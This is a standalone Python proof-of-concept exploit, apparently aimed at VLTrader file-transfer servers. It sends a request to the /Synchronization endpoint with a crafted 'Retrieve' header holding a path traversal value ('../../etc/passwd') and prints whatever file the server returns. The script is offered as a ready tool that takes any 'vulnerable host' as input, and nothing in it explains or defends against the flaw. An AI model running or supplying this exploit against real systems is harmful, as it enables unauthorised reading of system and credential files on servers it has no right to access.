import requests
import argparse
import warnings

warnings.filterwarnings("ignore")

url0 = '/Synchronization'

parser=argparse.ArgumentParser()
parser.add_argument("--host", help="input the vulnerable host", type=str)
args = parser.parse_args()

# http://xx.xx.xx.xx:xxxx
host = args.host

print(host)


cookies = {
    'csrftoken': 'z1GtnjQWsIKwGazlFX7V',
    'csrftoken': 'NX6iujIUcamW9umprA1vx19dzU6EZNLa',
    'csrftoken': 'kZ4jVQ4uZtITYtnweSsVDUEwZ2ltraTF',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
    'Accept': '*/*',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Connection': 'keep-alive',
    'Priority': 'u=4',
    'Retrieve': 'l=Ab1234-RQ0258;n=VLTrader;v=7.2.1;a=1337;po=1337;s=True;b=False;pp=1337;path=../../etc/passwd',
}


try:
	response = requests.get(f'{host}{url0}', cookies=cookies, headers=headers,timeout=5)
	if response.status_code == 200:
		print(f'************************ {len(response.text)} ************************\n')
		print(response.text)
except requests.exceptions.HTTPError as http_err:
	print(f"HTTP 错误: {http_err}")
except requests.exceptions.ConnectionError as conn_err:
	print(f"连接错误: {conn_err}")
except requests.exceptions.Timeout as timeout_err:
	print(f"请求超时: {timeout_err}")
except requests.exceptions.RequestException as req_err:
	print(f"请求错误: {req_err}")          